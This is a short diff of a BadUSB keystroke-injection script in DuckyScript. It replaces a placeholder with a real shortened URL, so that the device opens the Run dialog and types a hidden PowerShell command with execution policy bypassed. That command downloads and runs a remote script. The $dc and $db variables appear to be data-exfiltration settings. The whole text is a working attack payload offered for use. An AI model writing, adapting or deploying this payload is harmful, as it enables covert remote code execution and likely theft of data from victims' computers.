@@ -1,4 +1,4 @@
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -Ep Bypass $dc='';$db='';irm SHORTURLTOYOURPSFILERAW | iex
+STRING powershell -w h -NoP -Ep Bypass $dc='';$db='';irm https://t.ly/OJzby | iex
 ENTER
